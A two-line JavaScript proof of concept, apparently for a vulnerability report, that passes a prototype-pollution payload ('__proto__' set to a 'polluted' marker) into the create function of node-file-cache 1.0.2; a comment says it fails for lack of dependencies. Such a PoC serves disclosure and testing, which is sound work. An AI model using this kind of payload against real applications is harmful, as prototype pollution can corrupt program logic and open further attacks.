// the PoC doesn't work due to lacking dependencies

const payload = JSON.parse('{"__proto__": {"polluted": "yes"}}')
const cache = require('./node-file-cache@1.0.2').create(payload)
